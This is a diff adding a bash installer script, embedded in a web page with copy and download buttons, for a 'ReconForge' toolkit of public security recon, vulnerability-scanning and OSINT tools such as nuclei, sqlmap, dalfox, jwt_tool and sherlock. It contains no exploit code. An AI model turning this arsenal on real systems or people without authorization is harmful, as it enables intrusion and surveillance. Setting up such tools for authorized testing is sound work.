+    ["nuclei"]="github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"
+    ["naabu"]="github.com/projectdiscovery/naabu/v2/cmd/naabu@latest"
+    ["dnsx"]="github.com/projectdiscovery/dnsx/cmd/dnsx@latest"
+    ["anew"]="github.com/tomnomnom/anew@latest"
+    ["alterx"]="github.com/projectdiscovery/alterx/cmd/alterx@latest"
+    ["asnmap"]="github.com/projectdiscovery/asnmap/cmd/asnmap@latest"
+    ["dalfox"]="github.com/hahwul/dalfox/v2@latest"
+    ["gau"]="github.com/lc/gau/v2/cmd/gau@latest"
+    ["waybackurls"]="github.com/tomnomnom/waybackurls@latest"
+    ["assetfinder"]="github.com/tomnomnom/assetfinder@latest"
+    ["chaos"]="github.com/projectdiscovery/chaos-client/cmd/chaos@latest"
+    ["subzy"]="github.com/LukaSikic/subzy@latest"
+    ["notify"]="github.com/projectdiscovery/notify/cmd/notify@latest"
+    ["interactsh-client"]="github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest"
+    ["shosubgo"]="github.com/incogbyte/shosubgo@latest"
+    ["airixss"]="github.com/ferreiraklet/airixss@latest"
+    ["kxss"]="github.com/Emoe/kxss@latest"
+    ["qsreplace"]="github.com/tomnomnom/qsreplace@latest"
+    ["Gxss"]="github.com/KathanP19/Gxss@latest"
+    ["shortscan"]="github.com/bitquark/shortscan/cmd/shortscan@latest"
+    ["uncover"]="github.com/projectdiscovery/uncover/cmd/uncover@latest"
+    ["gf"]="github.com/tomnomnom/gf@latest"
+    ["ffuf"]="github.com/ffuf/ffuf/v2@latest"
+)
+
+for TOOL in "\${!GO_TOOLS[@]}"; do
+    PKG="\${GO_TOOLS[$TOOL]}"
+    echo -ne "  \${C_BLUE}→ Installing \${TOOL}...\${C_RESET} "
+    go install -v "$PKG" >/dev/null 2>&1 || true
+    if command -v "$TOOL" >/dev/null 2>&1 || [ -f "$GOPATH/bin/$TOOL" ]; then
+        echo -e "\${C_GREEN}[INSTALLED]\${C_RESET}"
+    else
+        echo -e "\${C_YELLOW}[VERIFY]\${C_RESET}"
+    fi
+done
+
+# Update Nuclei templates immediately
+if command -v nuclei >/dev/null 2>&1 || [ -f "$GOPATH/bin/nuclei" ]; then
+    echo -e "\${C_CYAN}[+] Updating Nuclei vulnerability templates to latest release...\${C_RESET}"
+    nuclei -update-templates -silent 2>/dev/null || "$GOPATH/bin/nuclei" -update-templates -silent 2>/dev/null || true
+fi
+
+# --- STEP 5: PYTHON CLI TOOLS INSTALLATION ---
+echo -e "\${C_CYAN}[+] Step 5: Installing Python Recon Tools & Libraries...\${C_RESET}"
+pip3 install --upgrade --break-system-packages \\
+    arjun dirsearch sqlmap uro x8 holehe theHarvester maigret trufflehog \\
+    requests beautifulsoup4 jsbeautifier shodan >/dev/null 2>&1 || \\
+pip3 install --upgrade \\
+    arjun dirsearch sqlmap uro x8 holehe theHarvester maigret trufflehog \\
+    requests beautifulsoup4 jsbeautifier shodan >/dev/null 2>&1 || true
+
+echo -e "\${C_GREEN}[✓] Python CLI packages installed.\${C_RESET}"
+
+# --- STEP 6: CLONE SPECIALIZED PYTHON RECON TOOLS ---
+echo -e "\${C_CYAN}[+] Step 6: Cloning Field-Tested Repositories to \${INSTALL_DIR}...\${C_RESET}"
+
+clone_or_update() {
+    local NAME="$1"
+    local URL="$2"
+    local TARGET="\${INSTALL_DIR}/\${NAME}"
+    echo -ne "  \${C_BLUE}→ Cloning \${NAME}...\${C_RESET} "
+    if [ -d "$TARGET/.git" ]; then
+        git -C "$TARGET" pull --quiet >/dev/null 2>&1 || true
+        echo -e "\${C_GREEN}[UPDATED]\${C_RESET}"
+    else
+        git clone --depth 1 "$URL" "$TARGET" --quiet >/dev/null 2>&1 || true
+        echo -e "\${C_GREEN}[CLONED]\${C_RESET}"
+    fi
+}
+
+clone_or_update "LinkFinder"     "https://github.com/GerbenJavado/LinkFinder.git"
+clone_or_update "SecretFinder"   "https://github.com/m4ll0k/SecretFinder.git"
+clone_or_update "GitDorker"      "https://github.com/obheda12/GitDorker.git"
+clone_or_update "favUp"          "https://github.com/pielco11/fav-up.git"
+clone_or_update "favirecon"      "https://github.com/edoardottt/favirecon.git"
+clone_or_update "FavFreak"       "https://github.com/devanshbatham/FavFreak.git"
+clone_or_update "jwt_tool"       "https://github.com/ticarpi/jwt_tool.git"
+clone_or_update "cloud_enum"     "https://github.com/initstring/cloud_enum.git"
+clone_or_update "s3scanner"      "https://github.com/sa7mon/S3Scanner.git"
+clone_or_update "sherlock"       "https://github.com/sherlock-project/sherlock.git"
+clone_or_update "blackbird"      "https://github.com/p1ngul1n0/blackbird.git"
+clone_or_update "mosint"         "https://github.com/alpkeskin/mosint.git"
+clone_or_update "CloakQuest3r"   "https://github.com/spyboy-productions/CloakQuest3r.git"
+clone_or_update "bxss"           "https://github.com/ethicalhackingplayground/bxss.git"
+
+# Install requirements for cloned tools
+echo -e "\${C_CYAN}[+] Step 7: Resolving Dependencies for Cloned Repositories...\${C_RESET}"
+for REPO in LinkFinder SecretFinder GitDorker favUp jwt_tool cloud_enum sherlock blackbird mosint CloakQuest3r; do
+    if [ -f "\${INSTALL_DIR}/\${REPO}/requirements.txt" ]; then
+        pip3 install --break-system-packages -r "\${INSTALL_DIR}/\${REPO}/requirements.txt" >/dev/null 2>&1 || \\
+        pip3 install -r "\${INSTALL_DIR}/\${REPO}/requirements.txt" >/dev/null 2>&1 || true
+    fi
+done
+
+# Create global wrapper symlinks in /usr/local/bin so they can be run directly anywhere
+echo -e "\${C_CYAN}[+] Step 8: Creating Global CLI Shortcuts...\${C_RESET}"
+[ -f "\${INSTALL_DIR}/SecretFinder/SecretFinder.py" ] && $SUDO_CMD ln -sf "\${INSTALL_DIR}/SecretFinder/SecretFinder.py" /usr/local/bin/SecretFinder.py 2>/dev/null || true
+[ -f "\${INSTALL_DIR}/LinkFinder/linkfinder.py" ]     && $SUDO_CMD ln -sf "\${INSTALL_DIR}/LinkFinder/linkfinder.py" /usr/local/bin/linkfinder.py 2>/dev/null || true
+[ -f "\${INSTALL_DIR}/jwt_tool/jwt_tool.py" ]         && $SUDO_CMD ln -sf "\${INSTALL_DIR}/jwt_tool/jwt_tool.py" /usr/local/bin/jwt_tool.py 2>/dev/null || true
+[ -f "\${INSTALL_DIR}/GitDorker/GitDorker.py" ]       && $SUDO_CMD ln -sf "\${INSTALL_DIR}/GitDorker/GitDorker.py" /usr/local/bin/GitDorker.py 2>/dev/null || true
+
+# --- STEP 9: WORDLISTS & GF PATTERNS SETUP ---
+echo -e "\${C_CYAN}[+] Step 9: Configuring GF Patterns & SecLists...\${C_RESET}"
+
+# GF Patterns
+if [ ! -d "$HOME/Gf-Patterns" ]; then
+    git clone --depth 1 "https://github.com/1ndianl33t/Gf-Patterns.git" "$HOME/Gf-Patterns" --quiet 2>/dev/null || true
+fi
+if [ -d "$HOME/Gf-Patterns" ]; then
+    cp -r "$HOME/Gf-Patterns"/*.json "$HOME/.gf/" 2>/dev/null || true
+    echo -e "\${C_GREEN}[✓] GF Patterns (xss, sqli, ssrf, redirect, lfi) copied to ~/.gf/\${C_RESET}"
+fi
+
+# SecLists
+if [ ! -d "/usr/share/seclists" ]; then
+    echo -e "\${C_YELLOW}[*] SecLists not found in /usr/share/seclists. Setting up...\${C_RESET}"
+    if [ ! -d "$WORDLIST_DIR/SecLists" ]; then
+        git clone --depth 1 "https://github.com/danielmiessler/SecLists.git" "$WORDLIST_DIR/SecLists" --quiet 2>/dev/null || true
+    fi
+    if [ -d "$WORDLIST_DIR/SecLists" ]; then
+        $SUDO_CMD mkdir -p /usr/share/seclists 2>/dev/null || true
+        $SUDO_CMD ln -sf "$WORDLIST_DIR/SecLists"/* /usr/share/seclists/ 2>/dev/null || true
+        echo -e "\${C_GREEN}[✓] SecLists symlinked to /usr/share/seclists\${C_RESET}"
+    fi
+else
+    echo -e "\${C_GREEN}[✓] SecLists already available at /usr/share/seclists\${C_RESET}"
+fi
+
+# --- SUMMARY & VERIFICATION ---
+echo ""
+echo -e "\${C_CYAN}==============================================================================\${C_RESET}"
+echo -e "\${C_GREEN}\${C_BOLD}   🎉 ALL RECONFORGE ARSENAL TOOLS INSTALLED & CONFIGURED SUCCESSFULLY!\${C_RESET}"
+echo -e "\${C_CYAN}==============================================================================\${C_RESET}"
+echo -e "  • Go Binaries:     \${C_BOLD}$HOME/go/bin\${C_RESET} (Exported to PATH)"
+echo -e "  • Cloned Tools:    \${C_BOLD}$INSTALL_DIR\${C_RESET}"
+echo -e "  • Wordlists:       \${C_BOLD}/usr/share/seclists / $WORDLIST_DIR\${C_RESET}"
+echo -e "  • GF Patterns:     \${C_BOLD}$HOME/.gf/\${C_RESET}"
+echo ""
+echo -e "\${C_YELLOW}[!] Pro Tip: Run 'source ~/.bashrc' or open a new terminal tab to refresh PATH.\${C_RESET}"
+echo -e "\${C_CYAN}==============================================================================\${C_RESET}"
+`;
+
+  function initInstallerPanel(){
+    const codeEl = document.getElementById('installerScriptCode');
+    if(codeEl && !codeEl.textContent){
+      codeEl.textContent = scriptContent;
+    }
+
+    const copyBtn = document.getElementById('installerCopyBtn');
+    if(copyBtn){
+      copyBtn.addEventListener('click', ()=>{
+        navigator.clipboard.writeText(scriptContent).then(()=>{
+          copyBtn.textContent = '✅ Copied Script!';
+          setTimeout(()=>copyBtn.textContent = '📋 Copy Full Installer Script', 1500);
+        });
+      });
+    }
+
+    const dlBtn = document.getElementById('installerDlBtn');
+    if(dlBtn){
+      dlBtn.addEventListener('click', ()=>{
+        const blob = new Blob([scriptContent], { type: 'text/x-shellscript' });
+        const a = document.createElement('a');
+        a.href = URL.createObjectURL(blob);
+        a.download = 'install_reconforge_tools.sh';
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        URL.revokeObjectURL(a.href);
+      });
+    }
+  }
+
+  if(document.readyState === 'loading'){
+    document.addEventListener('DOMContentLoaded', initInstallerPanel);
+  } else {
+    initInstallerPanel();
+  }
+})();
 
 </script>
 </body>
